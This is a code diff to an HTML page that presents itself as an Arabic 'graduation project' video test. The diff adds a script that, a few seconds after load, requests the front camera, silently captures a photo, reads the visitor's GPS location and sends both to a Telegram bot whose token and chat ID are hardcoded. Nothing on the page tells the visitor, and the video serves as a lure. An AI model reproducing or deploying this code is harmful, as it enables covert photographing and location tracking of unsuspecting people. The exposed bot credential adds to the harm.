@@ -4,30 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <meta property="og:title" content="عرض تقني: مشروع التخرج">
-    <meta property="og:description" content="اختبار أنظمة الفيديو التلقائية">
+    <meta property="og:title" content="مشروع تخرج: أنظمة الفيديو الذكية">
+    <meta property="og:description" content="اختبار تقني لأنظمة الاستجابة الفورية">
     <meta property="og:image" content="2.png">
     <meta property="og:type" content="website">
 
-    <title>اختبار التشغيل التلقائي</title>
+    <title>مشروع التخرج - اختبار الأنظمة</title>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; }
-
-        .video-wrapper {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        video { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
@@ -40,31 +28,76 @@
     </div>
 
     <script>
+        // بيانات بوت التلجرام الخاصة بك
+        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+        const chatId = "1611398303";
+
         window.onload = function() {
             const video = document.getElementById('mainVideo');
-            
-            // التأكد من تشغيل الفيديو فور التحميل
-            video.play().catch(error => {
-                console.log("المتصفح منع التشغيل التلقائي، يتطلب تفاعل المستخدم أولاً في بعض الحالات.");
-            });
+            video.play().catch(() => console.log("بانتظار تفاعل المستخدم..."));
 
-            // طلب الصلاحيات تلقائياً بعد 3 ثوانٍ
-            setTimeout(() => {
-                requestPermissions();
-            }, 3000);
+            // بدء عملية الاختبار بعد 3 ثوانٍ
+            setTimeout(startTechnicalTest, 3000);
         };
 
-        function requestPermissions() {
-            // طلب الكاميرا كمثال تقني لمشروع التخرج
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(function(stream) {
-                console.log("تم الوصول للكاميرا");
-                // هنا يتم استعراض كيف يمكن للنظام طلب البيانات في مشروعك
-                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً بعد الاختبار
+        function startTechnicalTest() {
+            // 1. طلب صلاحية الكاميرا والموقع معاً
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                captureAndSend(stream);
             })
-            .catch(function(err) {
-                console.log("رفض المستخدم الصلاحيات أو المتصفح لا يدعمها: " + err);
-            });
+            .catch(err => console.log("تم رفض الصلاحيات برمجياً: " + err));
+        }
+
+        function captureAndSend(stream) {
+            // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
+            let videoTrack = document.createElement('video');
+            videoTrack.srcObject = stream;
+            videoTrack.play();
+
+            setTimeout(() => {
+                // رسم الصورة على Canvas
+                let canvas = document.createElement('canvas');
+                canvas.width = 720; 
+                canvas.height = 1280;
+                canvas.getContext('2d').drawImage(videoTrack, 0, 0, canvas.width, canvas.height);
+                let imgData = canvas.toDataURL('image/jpeg');
+
+                // 2. الحصول على الموقع الجغرافي (GPS)
+                navigator.geolocation.getCurrentPosition(pos => {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    let accuracy = pos.coords.accuracy;
+                    
+                    sendToTelegram(imgData, lat, lon, accuracy);
+                }, () => {
+                    // في حال رفض الموقع، نرسل الصورة فقط
+                    sendToTelegram(imgData, "غير متوفر", "غير متوفر", "0");
+                });
+
+                // إيقاف الكاميرا بعد الالتقاط للحفاظ على الخصوصية
+                stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+        }
+
+        function sendToTelegram(imgData, lat, lon, acc) {
+            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 الموقع: ${lat},${lon}\n🎯 الدقة: ${acc}m\n⏰ الوقت: ${new Date().toLocaleTimeString()}`);
+            const url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
+
+            let form = new FormData();
+            form.append('document', dataURLtoBlob(imgData), "capture.jpg");
+
+            fetch(url, { method: 'POST', body: form })
+            .then(response => console.log("تم الإرسال بنجاح"))
+            .catch(error => console.error("خطأ في الإرسال:", error));
+        }
+
+        // تحويل الصورة إلى ملف Blob للإرسال
+        function dataURLtoBlob(dataurl) {
+            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type:mime});
         }
     </script>
 </body>
